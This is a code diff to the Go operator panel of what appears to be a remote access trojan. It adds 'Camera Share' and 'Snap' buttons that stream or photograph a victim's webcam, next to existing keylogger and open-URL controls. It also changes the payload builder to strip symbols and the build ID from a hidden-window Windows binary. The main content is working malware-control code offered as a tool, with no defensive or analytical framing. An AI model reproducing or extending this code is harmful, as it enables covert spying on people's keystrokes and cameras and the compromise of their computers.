@@ -172,10 +172,8 @@ func handleClient(client *Connection) {
 				Screen.Close()
 
 			case "<START>":
-				Display.SetText(Display.Text + readAll("<END>"))
-				Display.SetText(Display.Text + "\n\n")
-
-				Display.CursorRow = len(Display.Text)
+				content := readAll("<END>")
+				Display.SetText(content)
 
 			case "<LOG>":
 				data := readAll("<END>")
@@ -187,6 +185,9 @@ func handleClient(client *Connection) {
 				data := readAll("<END>")
 				os.WriteFile(filename, decompress([]byte(data)), 0644)
 				exec.Command("explorer.exe", ".\\").Start()
+
+			case "<ERR>":
+				streaming = false
 			}
 		}
 		time.Sleep(time.Millisecond * 200)
@@ -214,7 +215,7 @@ func build(host, port string) {
 	Building.SetText(Building.Text + "[+] Compilation process started.\n")
 	exec.Command("go.exe", "mod", "init", "build").Run()
 	exec.Command("go.exe", "mod", "tidy").Run()
-	exec.Command("go.exe", "build", "--ldflags", "-s -H windowsgui", "build.go").Run()
+	exec.Command("go.exe", "build", "--ldflags", "-s -w -H windowsgui -buildid=", "build.go").Run()
 	Building.SetText(Building.Text + "[+] Compilation completed successfully.\n")
 	time.Sleep(time.Millisecond * 200)
 	Building.SetText(Building.Text + "[+] Cleanup in progress...\n")
@@ -315,8 +316,25 @@ func main() {
 			} else {
 				err.Show()
 			}
-
 		}),
+
+		widget.NewButtonWithIcon("Camera Share", theme.MediaVideoIcon(), func() {
+			if selected.conn != nil {
+				dialog.NewCustomConfirm("Camera Share", "Start", "Stop", widget.NewLabel("Select Method..."), func(b bool) {
+					if b && !streaming {
+						writeCommand("\x16")
+						writeCommand("1")
+					} else if streaming && !b {
+						writeCommand("\x16")
+						writeCommand("0")
+						streaming = false
+					}
+				}, myWindow).Show()
+			} else {
+				err.Show()
+			}
+		}),
+
 		widget.NewButtonWithIcon("Open Url", theme.MailAttachmentIcon(), func() {
 			if selected.conn != nil && !streaming {
 				myEntry1.SetPlaceHolder("URL...")
@@ -438,6 +456,16 @@ func main() {
 			}
 		}),
 
+		widget.NewButtonWithIcon("Snap", theme.MediaPhotoIcon(), func() {
+			if selected.conn != nil {
+				if !streaming {
+					writeCommand("\x17")
+				}
+			} else {
+				err.Show()
+			}
+		}),
+
 		widget.NewButtonWithIcon("Keylogger", theme.CheckButtonCheckedIcon(), func() {
 			if selected.conn != nil {
 				dialog.NewCustomConfirm("Keylogger", "Start", "Stop", widget.NewLabel("Select Method..."), func(b bool) {
@@ -552,13 +580,13 @@ func main() {
 				portEntry.SetText("")
 			})),
 		)),
-		container.NewTabItemWithIcon("Logs", theme.DocumentIcon(),
+		container.NewTabItemWithIcon("Responses", theme.DocumentIcon(),
 			container.NewVBox(
-				widget.NewLabelWithStyle("Logs", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
+				widget.NewLabelWithStyle("Responses", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
 				Display,
 				widget.NewCard("", "", widget.NewButton("Save Log", func() {
-					os.WriteFile(fmt.Sprintf("%v@logs.log", time.Now().Format("02.01")), []byte(Display.Text), 0644)
-					dialog.NewInformation("Log Saved!", fmt.Sprintf("Log saved in '%v@logs.log'.", time.Now().Format("02.01")), myWindow).Show()
+					os.WriteFile(fmt.Sprintf("%v@response.log", time.Now().Format("02.01")), []byte(Display.Text), 0644)
+					dialog.NewInformation("Response Saved!", fmt.Sprintf("Log saved in '%v@response.log'.", time.Now().Format("02.01")), myWindow).Show()
 					exec.Command("explorer.exe", ".\\").Start()
 				})),
 			),
